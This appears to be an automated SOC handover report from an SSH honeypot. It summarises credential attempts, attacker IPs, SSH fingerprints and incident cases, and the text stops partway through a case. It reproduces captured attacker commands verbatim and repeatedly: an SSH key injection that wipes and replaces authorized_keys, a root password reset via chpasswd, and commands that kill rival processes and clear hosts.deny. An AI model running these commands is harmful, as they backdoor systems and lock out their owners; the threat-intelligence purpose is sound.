# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-14 |
| **Generated At** | 2026-04-14T11:08:13Z |
| **Shift Time** | 11:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **152** |
| Confirmed Threats | **149** |
| False Positives Filtered | **3** (2.0%) |
| Unique Attacker IPs | **14** |
| Countries of Origin | **10** |
| High Severity Cases | **61** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **91** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **145** |
| Unique Credential Pairs | **56** |
| Unique Usernames | **33** |
| Unique Passwords | **55** |
| Successful Auth Pairs | **36** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 63 |
| `345gs5662d34` | 31 |
| `ubuntu` | 4 |
| `vpn` | 4 |
| `odoo` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 31 |
| `3245gs5662d34` | 30 |
| `` | 4 |
| `ass` | 3 |
| `admin@12` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 31 |
| `root` | `3245gs5662d34` | 30 |
| `root` | `ass` | 3 |
| `root` | `admin@12` | 3 |
| `root` | `qwepoi` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwepoi` | `185.233.3.95` | 2026-04-14T09:41:36 |
| `root` | `3245gs5662d34` | `185.233.3.95` | 2026-04-14T09:41:41 |
| `root` | `ass` | `103.191.14.243` | 2026-04-14T09:42:08 |
| `root` | `3245gs5662d34` | `103.191.14.243` | 2026-04-14T09:42:11 |
| `root` | `qwepoi` | `154.198.215.50` | 2026-04-14T09:47:31 |
| `root` | `3245gs5662d34` | `154.198.215.50` | 2026-04-14T09:47:37 |
| `root` | `Guest123!` | `103.147.211.2` | 2026-04-14T09:48:09 |
| `root` | `3245gs5662d34` | `103.147.211.2` | 2026-04-14T09:48:11 |
| `root` | `Root123123@123` | `154.198.215.50` | 2026-04-14T09:49:19 |
| `root` | `Azerty2025` | `186.30.115.187` | 2026-04-14T09:49:24 |
| `root` | `3245gs5662d34` | `186.30.115.187` | 2026-04-14T09:49:34 |
| `root` | `ZAQ!2wsx54321!@#` | `103.147.211.2` | 2026-04-14T09:54:00 |
| `root` | `ZAQ!2wsx@#` | `154.198.215.50` | 2026-04-14T09:54:09 |
| `root` | `DDxx1234` | `103.147.211.2` | 2026-04-14T09:57:22 |
| `root` | `li123456.` | `154.198.215.50` | 2026-04-14T09:58:51 |
| `root` | `12345.com` | `186.30.115.187` | 2026-04-14T09:59:06 |
| `root` | `ZAQ!2wsx54321!@#` | `186.30.115.187` | 2026-04-14T10:01:06 |
| `root` | `ZAQ!2wsx2022` | `103.147.211.2` | 2026-04-14T10:02:41 |
| `root` | `xxCC112233` | `154.198.215.50` | 2026-04-14T10:03:55 |
| `root` | `12345.com` | `103.147.211.2` | 2026-04-14T10:04:25 |
| `root` | `Guest123!` | `186.30.115.187` | 2026-04-14T10:05:10 |
| `root` | `Hn123456` | `103.147.211.2` | 2026-04-14T10:07:43 |
| `root` | `admin@12` | `186.30.115.187` | 2026-04-14T10:10:46 |
| `root` | `root2023@` | `103.147.211.2` | 2026-04-14T10:11:03 |
| `root` | `Bismillah` | `154.198.215.50` | 2026-04-14T10:11:49 |
| `root` | `root2023@` | `186.30.115.187` | 2026-04-14T10:12:37 |
| `root` | `Q1w2e3r4t5y6` | `154.198.215.50` | 2026-04-14T10:15:05 |
| `root` | `admin@12` | `103.147.211.2` | 2026-04-14T10:16:12 |
| `root` | `Hn123456` | `186.30.115.187` | 2026-04-14T10:16:38 |
| `root` | `DDxx1234` | `186.30.115.187` | 2026-04-14T10:18:32 |
| `root` | `Azerty2025` | `103.147.211.2` | 2026-04-14T10:24:42 |
| `root` | `system2024` | `154.198.215.50` | 2026-04-14T10:24:47 |
| `root` | `ZAQ!2wsx2022` | `186.30.115.187` | 2026-04-14T10:26:22 |
| `root` | `admin@12` | `154.198.215.50` | 2026-04-14T10:26:25 |
| `root` | `ass` | `103.147.211.2` | 2026-04-14T10:28:08 |
| `root` | `ass` | `186.30.115.187` | 2026-04-14T10:32:16 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **152** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 139 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 139 | 7 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 139 | 7 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:mF9ky8iWhyDP"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `186.30.115.187`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.147.211.2`, `185.233.3.95`, `103.191.14.243`, `154.198.215.50`, `186.30.115.187`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **14** |
| Unique ASNs | **14** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 1 | LOW |
| `AS19429` | ETB - Colombia | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS150544` | PT Global Visi Vindici | 1 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS31244` | MY SERVER MEDIA SRL | 1 | HIGH |
| `AS40065` | CNSERVERS LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (61)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-be562bee3140

| Field | Detail |
|---|---|
| **Source IP** | `185.233.3[.]95` |
| **First Seen** | 2026-04-14 09:41 |
| **Last Seen** | 2026-04-14 09:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:41:34` | `cowrie.session.connect` |
| `2026-04-14 09:41:34` | `cowrie.client.version` |
| `2026-04-14 09:41:35` | `cowrie.client.kex` |
| `2026-04-14 09:41:36` | `cowrie.login.success` |
| `2026-04-14 09:41:36` | `cowrie.session.params` |
| `2026-04-14 09:41:36` | `cowrie.command.input` |
| `2026-04-14 09:41:36` | `cowrie.command.failed` |
| `2026-04-14 09:41:36` | `cowrie.log.closed` |
| `2026-04-14 09:41:37` | `cowrie.session.params` |
| `2026-04-14 09:41:37` | `cowrie.command.input` |
| `2026-04-14 09:41:37` | `cowrie.session.file_download` |
| `2026-04-14 09:41:37` | `cowrie.log.closed` |
| `2026-04-14 09:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.233.3[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.233.3[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f1c39d1eb8

| Field | Detail |
|---|---|
| **Source IP** | `185.233.3[.]95` |
| **First Seen** | 2026-04-14 09:41 |
| **Last Seen** | 2026-04-14 09:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:41:40` | `cowrie.session.connect` |
| `2026-04-14 09:41:40` | `cowrie.client.version` |
| `2026-04-14 09:41:40` | `cowrie.client.kex` |
| `2026-04-14 09:41:41` | `cowrie.login.success` |
| `2026-04-14 09:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.233.3[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.233.3[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48da41e4efea

| Field | Detail |
|---|---|
| **Source IP** | `103.191.14[.]243` |
| **First Seen** | 2026-04-14 09:42 |
| **Last Seen** | 2026-04-14 09:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:42:08` | `cowrie.session.connect` |
| `2026-04-14 09:42:08` | `cowrie.client.version` |
| `2026-04-14 09:42:08` | `cowrie.client.kex` |
| `2026-04-14 09:42:08` | `cowrie.login.success` |
| `2026-04-14 09:42:09` | `cowrie.session.params` |
| `2026-04-14 09:42:09` | `cowrie.command.input` |
| `2026-04-14 09:42:09` | `cowrie.command.failed` |
| `2026-04-14 09:42:09` | `cowrie.log.closed` |
| `2026-04-14 09:42:09` | `cowrie.session.params` |
| `2026-04-14 09:42:09` | `cowrie.command.input` |
| `2026-04-14 09:42:09` | `cowrie.session.file_download` |
| `2026-04-14 09:42:09` | `cowrie.log.closed` |
| `2026-04-14 09:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.14[.]243` to AbuseIPDB if not already reported
- [ ] Block `103.191.14[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794af65bb3f3

| Field | Detail |
|---|---|
| **Source IP** | `103.191.14[.]243` |
| **First Seen** | 2026-04-14 09:42 |
| **Last Seen** | 2026-04-14 09:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:42:11` | `cowrie.session.connect` |
| `2026-04-14 09:42:11` | `cowrie.client.version` |
| `2026-04-14 09:42:11` | `cowrie.client.kex` |
| `2026-04-14 09:42:11` | `cowrie.login.success` |
| `2026-04-14 09:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.14[.]243` to AbuseIPDB if not already reported
- [ ] Block `103.191.14[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9afc18174b48

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 09:47 |
| **Last Seen** | 2026-04-14 09:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:47:30` | `cowrie.session.connect` |
| `2026-04-14 09:47:30` | `cowrie.client.version` |
| `2026-04-14 09:47:31` | `cowrie.client.kex` |
| `2026-04-14 09:47:31` | `cowrie.login.success` |
| `2026-04-14 09:47:32` | `cowrie.session.params` |
| `2026-04-14 09:47:32` | `cowrie.command.input` |
| `2026-04-14 09:47:32` | `cowrie.command.failed` |
| `2026-04-14 09:47:32` | `cowrie.log.closed` |
| `2026-04-14 09:47:33` | `cowrie.session.params` |
| `2026-04-14 09:47:33` | `cowrie.command.input` |
| `2026-04-14 09:47:33` | `cowrie.session.file_download` |
| `2026-04-14 09:47:33` | `cowrie.log.closed` |
| `2026-04-14 09:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27866268f9a8

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 09:47 |
| **Last Seen** | 2026-04-14 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:47:35` | `cowrie.session.connect` |
| `2026-04-14 09:47:35` | `cowrie.client.version` |
| `2026-04-14 09:47:36` | `cowrie.client.kex` |
| `2026-04-14 09:47:37` | `cowrie.login.success` |
| `2026-04-14 09:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a659a1ec4177

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 09:48 |
| **Last Seen** | 2026-04-14 09:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:48:08` | `cowrie.session.connect` |
| `2026-04-14 09:48:08` | `cowrie.client.version` |
| `2026-04-14 09:48:08` | `cowrie.client.kex` |
| `2026-04-14 09:48:09` | `cowrie.login.success` |
| `2026-04-14 09:48:09` | `cowrie.session.params` |
| `2026-04-14 09:48:09` | `cowrie.command.input` |
| `2026-04-14 09:48:09` | `cowrie.command.failed` |
| `2026-04-14 09:48:09` | `cowrie.log.closed` |
| `2026-04-14 09:48:09` | `cowrie.session.params` |
| `2026-04-14 09:48:09` | `cowrie.command.input` |
| `2026-04-14 09:48:09` | `cowrie.session.file_download` |
| `2026-04-14 09:48:09` | `cowrie.log.closed` |
| `2026-04-14 09:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae00110d1a02

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 09:48 |
| **Last Seen** | 2026-04-14 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:48:11` | `cowrie.session.connect` |
| `2026-04-14 09:48:11` | `cowrie.client.version` |
| `2026-04-14 09:48:11` | `cowrie.client.kex` |
| `2026-04-14 09:48:11` | `cowrie.login.success` |
| `2026-04-14 09:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c009b6c1b12f

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 09:49 |
| **Last Seen** | 2026-04-14 09:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:49:18` | `cowrie.session.connect` |
| `2026-04-14 09:49:18` | `cowrie.client.version` |
| `2026-04-14 09:49:18` | `cowrie.client.kex` |
| `2026-04-14 09:49:19` | `cowrie.login.success` |
| `2026-04-14 09:49:19` | `cowrie.session.params` |
| `2026-04-14 09:49:19` | `cowrie.command.input` |
| `2026-04-14 09:49:19` | `cowrie.command.failed` |
| `2026-04-14 09:49:20` | `cowrie.log.closed` |
| `2026-04-14 09:49:20` | `cowrie.session.params` |
| `2026-04-14 09:49:20` | `cowrie.command.input` |
| `2026-04-14 09:49:20` | `cowrie.session.file_download` |
| `2026-04-14 09:49:20` | `cowrie.log.closed` |
| `2026-04-14 09:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ec8145dd60

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 09:49 |
| **Last Seen** | 2026-04-14 09:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:49:22` | `cowrie.session.connect` |
| `2026-04-14 09:49:22` | `cowrie.client.version` |
| `2026-04-14 09:49:22` | `cowrie.client.kex` |
| `2026-04-14 09:49:24` | `cowrie.login.success` |
| `2026-04-14 09:49:24` | `cowrie.session.params` |
| `2026-04-14 09:49:24` | `cowrie.command.input` |
| `2026-04-14 09:49:24` | `cowrie.command.failed` |
| `2026-04-14 09:49:25` | `cowrie.log.closed` |
| `2026-04-14 09:49:26` | `cowrie.session.params` |
| `2026-04-14 09:49:26` | `cowrie.command.input` |
| `2026-04-14 09:49:26` | `cowrie.session.file_download` |
| `2026-04-14 09:49:26` | `cowrie.log.closed` |
| `2026-04-14 09:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8caff594115c

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 09:49 |
| **Last Seen** | 2026-04-14 09:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:49:23` | `cowrie.session.connect` |
| `2026-04-14 09:49:23` | `cowrie.client.version` |
| `2026-04-14 09:49:23` | `cowrie.client.kex` |
| `2026-04-14 09:49:24` | `cowrie.login.success` |
| `2026-04-14 09:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d33836b971

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
